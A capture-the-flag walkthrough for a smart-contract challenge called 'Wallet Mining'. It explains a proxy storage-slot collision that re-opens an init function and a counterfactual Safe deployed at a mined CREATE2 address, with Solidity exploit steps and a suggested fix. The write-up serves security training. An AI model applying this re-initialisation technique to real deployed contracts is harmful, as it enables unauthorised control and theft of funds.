## Challenge 13 Walkthrough: Wallet Mining

### Vulnerability

There are two bugs, exploited together.

#### Primary: proxy storage collision re-opens `init`

`AuthorizerUpgradeable` keeps its init guard at storage slot 0:

```solidity
contract AuthorizerUpgradeable {
    uint256 public needsInit = 1;                                  // slot 0
    mapping(address => mapping(address => uint256)) private wards;  // slot 1
    function init(address[] memory _wards, address[] memory _aims) external {
        require(needsInit != 0, "cannot init");   // ← guard reads slot 0
        ...
        needsInit = 0;
    }
}
```

But it runs behind a `TransparentProxy` that declares its own variable at slot 0:

```solidity
contract TransparentProxy is ERC1967Proxy {
    address public upgrader = msg.sender;   // ← ALSO slot 0
    ...
}
```

The field initializer `upgrader = msg.sender` writes the (non-zero) upgrader address into proxy slot 0 — the same slot `init` reads as `needsInit`. After construction, `needsInit` reads back as that address (non-zero), so the guard is satisfied and **`init` can be called again by anyone**, granting arbitrary `(ward, aim)` authorizations.

#### Secondary: the deposit address is a counterfactual Safe

`USER_DEPOSIT_ADDRESS` already holds 20M DVT but has no code. It is simply the address a `SafeProxyFactory.createProxyWithNonce` deployment lands on for a specific `saltNonce` and a `Safe.setup` initializer that names `user` as owner:

```solidity
// salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce))
// address = CREATE2(factory, salt, keccak256(SafeProxy.creationCode ++ singleton))
```

Mining the nonce yields `saltNonce = 13` for this challenge's deterministic addresses.

### Exploit

Two things are prepared off-chain (cheatcodes, not player transactions): the mined `saltNonce = 13`, and the user's signature over the Safe's drain transaction (the player holds the user's key, so the user never sends a tx).

```solidity
bytes32 safeTxHash = _safeTxHash(USER_DEPOSIT_ADDRESS, address(token), drainData);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTxHash);
bytes memory sig = abi.encodePacked(r, s, v);

new WalletMiningAttacker(
    address(authorizer), address(walletDeployer), address(token),
    USER_DEPOSIT_ADDRESS, ward, initializer, 13, drainData, sig
);
```

Everything else happens in the attacker's constructor — a single player transaction (`vm.getNonce(player) == 1`):

**Step 1 — Re-initialize the Authorizer.** Exploit the slot-0 collision to authorize the attacker to deploy at the deposit address.

```solidity
IAuthorizer(authorizer).init([address(this)], [deposit]);
```

**Step 2 — Deploy the Safe and earn the reward.** `WalletDeployer.drop` now passes `can(attacker, deposit)`, deploys the Safe to the deposit address, and pays the attacker 1 DVT.

```solidity
IWalletDeployer(walletDeployer).drop(deposit, initializer, 13);
```

**Step 3 — Drain the deposit to the user.** The Safe's only owner is `user`; the pre-supplied signature authorizes a transfer of all 20M DVT to the user.

```solidity
ISafe(deposit).execTransaction(
    token, 0, drainData /* transfer(user, 20M) */, 0, 0, 0, 0, address(0), payable(address(0)), sig
);
```

**Step 4 — Pay the ward.** Forward the 1 DVT deployment reward to the ward.

```solidity
IERC20Like(token).transfer(ward, IERC20Like(token).balanceOf(address(this)));
```

### 🎯 Result: All `_isSolved()` Checks Pass

| Check | Passed Because |
|-------|----------------|
| Deposit address has code | Safe deployed there via mined `saltNonce = 13` |
| Deposit + wallet deployer hold 0 tokens | 20M drained to user, 1 DVT forwarded to ward |
| `vm.getNonce(user) == 0` | User only signed off-chain; never sent a tx |
| `vm.getNonce(player) == 1` | All steps run inside one attacker constructor |
| `token.balanceOf(user) == 20M` | Safe `execTransaction` drains the deposit to user |
| `token.balanceOf(ward) == reward` | Attacker forwards the 1 DVT `drop` reward |

### Why It Works

The Authorizer's init guard lives at the same storage slot the transparent proxy uses for its `upgrader`, so initialization never actually "locks" on the proxy — anyone can re-init and authorize themselves. With authorization obtained, the deposit address is just a counterfactual Safe whose owner is the user: deploy it at the mined CREATE2 address, then move its pre-funded tokens with the user's signature, all without the user ever transacting.

The fix is to give the proxy its bookkeeping a non-colliding slot (or use EIP-1967 namespaced storage) and to gate `init` with real access control rather than a single re-usable flag.

This is a **proxy storage-collision re-initialization combined with a counterfactual Safe deployment** — 20M DVT recovered for the user and the deployment reward routed to the ward, in one player transaction with zero user transactions.
